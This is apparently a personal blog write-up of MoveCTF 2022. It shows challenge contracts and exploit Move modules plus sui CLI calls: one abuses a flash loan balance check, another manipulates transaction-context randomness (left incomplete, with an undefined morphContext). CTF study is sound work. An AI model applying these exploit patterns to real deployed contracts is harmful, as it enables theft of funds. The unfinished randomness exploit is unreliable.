+++
title = "MoveCTF 2022"
description = " My approch towards the CTF challanges "
date = 2022-11-08T07:34:48+08:30
featured = false
draft = false
comment = false
toc = false
reward = true
categories = [ "Move", "SUI", "Security", "CTF", "Smart Contract", "Web3" ]
tags = [ "" ]
series = []
images = ["files/logo2.png"]
+++
<br/>
<br/>
<br/>
<p align="center" width="100%">
    <img width="33%" src="files/logo2.png"> 
</p>
<br/>
<br/>
<br/>


Sup?!


Hey, there! long time no see ah? I forgot to tell you that now I'm currently learning blokchain and its security. Recently, I tried to compete in MoveCTF which was organized by MoveBit, Ottersec and ChainFlag, sponsored by Mysten Labs(Sui). From the name we can understand that this ctf is conducted on Move langauge and the platform was Sui blockchain. 

I'm actually very new to Move (known for 3 days before CTF). Meanwhile, I'm learning Aptos, later shockingly known that this ctf was based on sui blockchain. Literally, I've been hurried up and learn sui in the period of ctf and try to compete. However, I tried to complete 3 out 4 ctf problems. 

1. Basic CheckIn - 100 pts
2. Flashloan - 200 pts
3. SimpleGame - 400 pts

## Basic CheckIn

```rs
module movectf::checkin {
    use sui::event;
    use sui::tx_context::{Self, TxContext};

    struct Flag has copy, drop {
        user: address,
        flag: bool
    }

    public entry fun get_flag(ctx: &mut TxContext) {
        event::emit(Flag {
            user: tx_context::sender(ctx),
            flag: true
        })
    }
}
```
If we call the ```get_flag``` funtion, then the flag becomes true.

```bash
$ sui client --call --function get_flag --module checkin --package <ProgramDeployedAddress> --gas-budget 1000
```

Level completed.

## Flash Loan

```rs
module movectf::flash{
    use sui::transfer;
    use sui::tx_context::{Self, TxContext};
    use sui::object::{Self, ID, UID};
    use sui::balance::{Self, Balance};
    use sui:: coin::{Self, Coin};
    use sui::vec_map::{Self, VecMap};
    use sui::event;
    struct FLASH has drop {}
    struct FlashLender has key {
        id: UID,
        to_lend: Balance<FLASH>,
        last: u64,
        lender: VecMap<address, u64>
    }
    struct Receipt {
        flash_lender_id: ID,
        amount: u64
    }
    struct AdminCap has key, store {
        id: UID,
        flash_lender_id: ID,
    }
    struct Flag has copy, drop {
        user: address,
        flag: bool
    }
    // creat a FlashLender
    public fun create_lend(lend_coin: Coin<FLASH>, ctx: &mut TxContext) {
        let to_lend = coin::into_balance(lend_coin);
        let id = object::new(ctx);
        let lender = vec_map::empty<address, u64>();
        let balance = balance::value(&to_lend);
        vec_map::insert(&mut lender ,tx_context::sender(ctx), balance);
        let flash_lender = FlashLender { id, to_lend, last: balance, lender};
        transfer::share_object(flash_lender);
    }
    // get the loan
    public fun loan(
        self: &mut FlashLender, amount: u64, ctx: &mut TxContext
    ): (Coin<FLASH>, Receipt) {
        let to_lend = &mut self.to_lend;
        assert!(balance::value(to_lend) >= amount, 0);
        let loan = coin::take(to_lend, amount, ctx);
        let receipt = Receipt { flash_lender_id: object::id(self), amount };

        (loan, receipt)
    }
    // repay coion to FlashLender
    public fun repay(self: &mut FlashLender, payment: Coin<FLASH>) {
        coin::put(&mut self.to_lend, payment)
    }
    // check the amount in FlashLender is correct 
    public fun check(self: &mut FlashLender, receipt: Receipt) {
        let Receipt { flash_lender_id, amount: _ } = receipt;
        assert!(object::id(self) == flash_lender_id, 0);
        assert!(balance::value(&self.to_lend) >= self.last, 0);
    }
    // init Flash
    fun init(witness: FLASH, ctx: &mut TxContext) {
        let cap = coin::create_currency(witness, 2, ctx);
        let owner = tx_context::sender(ctx);

        let flash_coin = coin::mint(&mut cap, 1000, ctx);

        create_lend(flash_coin, ctx);
        transfer::transfer(cap, owner);
    }
    // get  the balance of FlashLender
    public fun balance(self: &mut FlashLender, ctx: &mut TxContext) :u64 {
        *vec_map::get(&self.lender, &tx_context::sender(ctx))
    }

    // deposit token to FlashLender
    public entry fun deposit(
        self: &mut FlashLender, coin: Coin<FLASH>, ctx: &mut TxContext
    ) {
        let sender = tx_context::sender(ctx);
        if (vec_map::contains(&self.lender, &sender)) {
            let balance = vec_map::get_mut(&mut self.lender, &sender);
            *balance = *balance + coin::value(&coin);
        }else {
            vec_map::insert(&mut self.lender, sender, coin::value(&coin));
        };
        coin::put(&mut self.to_lend, coin);
    }

    // withdraw you token from FlashLender
    public entry fun withdraw(
        self: &mut FlashLender,
        amount: u64,
        ctx: &mut TxContext
    ){
        let owner = tx_context::sender(ctx);
        let balance = vec_map::get_mut(&mut self.lender, &owner);
        assert!(*balance >= amount, 0);
        *balance = *balance - amount;

        let to_lend = &mut self.to_lend;
        transfer::transfer(coin::take(to_lend, amount, ctx), owner);
    }

    // check whether you can get the flag
    public entry fun get_flag(self: &mut FlashLender, ctx: &mut TxContext) {
        if (balance::value(&self.to_lend) == 0) {
            event::emit(Flag { user: tx_context::sender(ctx), flag: true });
        }
    }
}
```
[Source](files/FlashLoan/flashloan.zip)

Inorder to get the flag, we must need to pass the FlashLender object which has a balance 0 (to_lend == 0). Otherwise, we can't able to get the flag. ```to_lend``` is decreasing only when a user takes loan from the object. So, now we need to take loan from the lender, it means we need to call ```public fun loan(...)```, but from Sui Cli we only able to call ```pub entry fun <name>(...)```. But from another contract ```public fun <name>(...)``` can be called. So, I tried to write a new contract with payload. But, I dont know Sui and Move. I was so obfuscated. However, after many trails and some chat with my new friend and I got to know how to do. So I got it. You can download and see .toml file to know how I'm able to call deployed contract's function from my contract.
[ExploitContract](files/FlashLoan/loan.zip)

```rs 
module exploit_package::attack{
    use movectf::flash::{
        FlashLender, loan, 
        FLASH, Receipt,
        get_flag,deposit,repay,check
    };
    use sui::tx_context::{ TxContext};
    use sui:: coin::{ Coin};

    public entry fun getFlag(
                    lender: &mut FlashLender,
                    payment: u64,ctx: &mut TxContext 
                    ){
        let (_load, receipt): (Coin<FLASH>, Receipt) = loan(lender,payment,ctx);
        get_flag(lender,ctx);
        repay(lender,_load);
        check(lender,receipt);
    }
}
```

That's the definition of a Flash Loan -- it is a loan that exists only for the duration of the transaction, and it must be repaid before the transaction finishes. The Receipt is part of the pattern (we call it a "Hot Potato") to enforce that repayment. So we must repay. but the ```get_flag``` only check the balance in object. So, If we takeout full balance and then call get_flag and then repay. Bamn. Done. Now we just have to call our payload contract.

```bash
$ sui client --call --function getFlag --module attack --package <ourDeployedAddress> --args <lenderAddress> 1000 --gas-budget 1000
```
Note: We can't just Drop returned receipt. There is a function there called check which accepts a Receipt, so calling that would fix things for you in one sense.

Level completed.


## Simple Game

[FullCode](files/SimpleGame/simplegame.zip)

```rs
// Hero Object - hero.move
const MAX_LEVEL: u64 = 2;
const INITAL_HERO_HP: u64 = 100;
const INITIAL_HERO_STRENGTH: u64 = 10;
const INITIAL_HERO_DEFENSE: u64 = 5;
const HERO_STAMINA: u64 = 200;

public(friend) fun create_hero(ctx: &mut TxContext): Hero {
    Hero {
        id: object::new(ctx),
        level: 1,
        stamina: HERO_STAMINA,
        hp: INITAL_HERO_HP,
        experience: 0,
        strength: INITIAL_HERO_STRENGTH,
        defense: INITIAL_HERO_DEFENSE,
        sword: option::none(),
        armor: option::none(),
    }
}
/// Strength of the hero when attacking
public fun strength(hero: &Hero): u64 {
    // a hero with zero HP is too tired to fight
    if (hero.hp == 0) {
        return 0
    };

    let sword_strength = if (option::is_some(&hero.sword)) {
        inventory::strength(option::borrow(&hero.sword))
    } else {
        // hero can fight without a sword, but will not be very strong
        0
    };
    hero.strength + sword_strength
}
/// Defense of the hero when attacking
public fun defense(hero: &Hero): u64 {
    // a hero with zero HP is too tired to fight
    if (hero.hp == 0) {
        return 0
    };

    let armor_defense = if (option::is_some(&hero.armor)) {
        inventory::defense(option::borrow(&hero.armor))
    } else {
        // hero can fight without a sword, but will not be very strong
        0
    };
    hero.defense + armor_defense
}

public fun hp(hero: &Hero): u64 {
    hero.hp
}
```

```rs
// Sword, Armor and TreasureBox objects - Inventroy.move
const MAX_RARITY: u64 = 5;
const BASE_SWORD_STRENGTH: u64 = 2;
const BASE_ARMOR_DEFENSE: u64 = 1;
/// The hero's trusty sword
struct Sword has store {   
    rarity: u64,
    strength: u64,
}
/// Armor
struct Armor has store {
    rarity: u64,
    defense: u64,
}
///TreasuryBox
struct TreasuryBox has key, store {
    id: UID,
}
```

```rs
// SPDX-License-Identifier: Apache-2.0

/// Example of a game character with basic attributes, inventory, and
/// associated logic.
module game::adventure {

/// A creature that the hero can slay to level up
struct Monster<phantom T> has key {
    id: UID,
    hp: u64,
    strength: u64,
    defense: u64,
}

struct Boar {}
struct BoarKing {}

/// Boar attributes values
const BOAR_MIN_HP: u64 = 80;
const BOAR_MAX_HP: u64 = 120;
const BOAR_MIN_STRENGTH: u64 = 5;
const BOAR_MAX_STRENGTH: u64 = 15;
const BOAR_MIN_DEFENSE: u64 = 4;
const BOAR_MAX_DEFENSE: u64 = 6;

/// BoarKing attributes values
const BOARKING_MIN_HP: u64 = 180;
const BOARKING_MAX_HP: u64 = 220;
const BOARKING_MIN_STRENGTH: u64 = 20;
const BOARKING_MAX_STRENGTH: u64 = 25;
const BOARKING_MIN_DEFENSE: u64 = 10;
const BOARKING_MAX_DEFENSE: u64 = 15;

fun create_monster<T>(
    min_hp: u64, max_hp: u64,
    min_strength: u64, max_strength: u64,
    min_defense: u64, max_defense: u64,
    ctx: &mut TxContext
): Monster<T> { 
    let id = object::new(ctx);       
    let hp = random::rand_u64_range(min_hp, max_hp, ctx);
    let strength = random::rand_u64_range(min_strength, max_strength, ctx);
    let defense = random::rand_u64_range(min_defense, max_defense, ctx);
    Monster<T> {
        id,
        hp,
        strength,
        defense,
    }
}

/// return: 0: tie, 1: hero win, 2: monster win;
fun fight_monster<T>(hero: &Hero, monster: &Monster<T>): u64 {
    let hero_strength = hero::strength(hero);
    let hero_defense = hero::defense(hero);
    let hero_hp = hero::hp(hero);
    let monster_hp = monster.hp;
    // attack the monster until its HP goes to zero
    let cnt = 0u64; // max fight times
    let rst = 0u64; // 0: tie, 1: hero win, 2: monster win;
    while (monster_hp > 0) {
        // first, the hero attacks
        let damage = if (hero_strength > monster.defense) {
            hero_strength - monster.defense
        } else {
            0
        };
        if (damage < monster_hp) {
            monster_hp = monster_hp - damage;
            // then, the boar gets a turn to attack. if the boar would kill
            // the hero, abort--we can't let the boar win!
            let damage = if (monster.strength > hero_defense) {
                monster.strength - hero_defense
            } else {
                0
            };
            if (damage >= hero_hp) {
                rst = 2;
                break
            } else {
                hero_hp = hero_hp - damage;
            }
        } else {
            rst = 1;
            break
        };
        cnt = cnt + 1;
        if (cnt > 20) {
            break
        }
    };
    rst
}

public entry fun slay_boar(hero: &mut Hero, ctx: &mut TxContext) {
    assert!(hero::stamina(hero) > 0, EHERO_TIRED);
    let boar = create_monster<Boar>(
        BOAR_MIN_HP, BOAR_MAX_HP,
        BOAR_MIN_STRENGTH, BOAR_MAX_STRENGTH,
        BOAR_MIN_DEFENSE, BOAR_MAX_DEFENSE,
        ctx
    );
    let fight_result = fight_monster<Boar>(hero, &boar);
    hero::decrease_stamina(hero, 1);
    // hero takes their licks
    if (fight_result == 1) {
        hero::increase_experience(hero, 1);

        let d100 = random::rand_u64_range(0, 100, ctx);
        if (d100 < 10) {
            let sword = inventory::create_sword(ctx);
            hero::equip_or_levelup_sword(hero, sword, ctx);
        } else if (d100 < 20) {
            let armor = inventory::create_armor(ctx);
            hero::equip_or_levelup_armor(hero, armor, ctx);
        };
    };
    // let the world know about the hero's triumph by emitting an event!
    event::emit(SlainEvent<Boar> {
        slayer_address: tx_context::sender(ctx),
        hero: hero::id(hero),
        boar: object::uid_to_inner(&boar.id),
    });
    let Monster<Boar> { id, hp: _, strength: _, defense: _} = boar;
    object::delete(id);
}

public entry fun slay_boar_king(hero: &mut Hero, ctx: &mut TxContext) {
    assert!(hero::stamina(hero) > 0, EHERO_TIRED);
    let boar = create_monster<BoarKing>(
        BOARKING_MIN_HP, BOARKING_MAX_HP,
        BOARKING_MIN_STRENGTH, BOARKING_MAX_STRENGTH,
        BOARKING_MIN_DEFENSE, BOARKING_MAX_DEFENSE,
        ctx
    );
    let fight_result = fight_monster<BoarKing>(hero, &boar);
    hero::decrease_stamina(hero, 2);
    // hero takes their licks
    if (fight_result == 1) { // hero won
        hero::increase_experience(hero, 2);

        let d100 = random::rand_u64_range(0, 100, ctx);
        if (d100 == 0) {
            let box = inventory::create_treasury_box(ctx);
            transfer::transfer(box, tx_context::sender(ctx));
        };
    };
    // let the world know about the hero's triumph by emitting an event!
    event::emit(SlainEvent<BoarKing> {
        slayer_address: tx_context::sender(ctx),
        hero: hero::id(hero),
        boar: object::uid_to_inner(&boar.id),
    });
    let Monster<BoarKing> { id, hp: _, strength: _, defense: _} = boar;
    object::delete(id);
}
```

```rs
//Exploit
module exploit_package::attack{
    use game::hero::{
        Hero,
        level_up,
    };
    use game::adventure::{
        slay_boar,slay_boar_king
    };
    use game::inventory::{
        TreasuryBox,
        get_flag
    };
    use ctf::random::{
        rand_u64_range
    };
    use sui::tx_context::{TxContext};

    public entry fun getFlag(box: TreasuryBox, ctx: &mut TxContext){
        let ctx_ = morphContext(ctx);
        if (rand_u64_range(0,100,ctx_) == 0){
            get_flag(box,ctx_);
        }else{
            // TODO: Morph ctx
            get_flag(box,ctx_);
        }
    }
    public entry fun winTreasureBox(hero: &mut Hero,ctx: &mut TxContext){
        let ctx_ = morphContext(ctx);
        if (rand_u64_range(0,100,ctx_)==0){
            let i = 0;
            while (i<=105){
                slay_boar(hero,ctx_);
                i = i+1;
            };
            level_up(hero);
            slay_boar_king(hero,ctx_);
        }
    }
}

```

Explanation:

Entry fun 1.
1. First we have to win the slay_boar to get sword (sworg give strength to hero)
2. It can be possible when randomFuntion(ctx) == 0
3. So, Now if can able to morphed the ctx on our contract side which results to give 0 when random funtions calls we can use move forward.
4. If we use the same ctx for next 100 times, every time slay_boar will loose and hero strength will increase.
5. So we can level up the hero with the same ctx
6. our Hero HP, Strength, Defence becomes x2 and Stamina will become 90+ [becomes Strength = 20, Defence = 10, HP = 200 ]
7. so slay_boar_king's MIN Strength will be less than our strength, Defence will be same as our Hero's, 
8. If we're in the same ctx, ofc it return 0 and we will win slay_boar_king,
9. then Treasure created and transfered to called pub key.
10. return

Note: Gas must be so high, because of computation.

Entry fun 2.
1. This function takes two args - Treasurebox ID and ctx
2. Like previous methodology, morph the ctx, so if we able to return 0 from ctx.
3. call get_flag with parameters.

```bash
$ sui client --call --function winTreasureBox --module attack --package <ourDeployedAddress> --args <HeroAddress> --gas-budget 10000
  ; # TRANSACTION OUTPUT
  ; # Mutated Objects
  ; # ...

$ sui client --call --function getFlag --module attack --package <ourDeployedAddress> --args<TresaureBoxAddress> --gas-budget 1000

```

Done. 

I enjoyed a lot of cool stuff this weekend, amn't I?





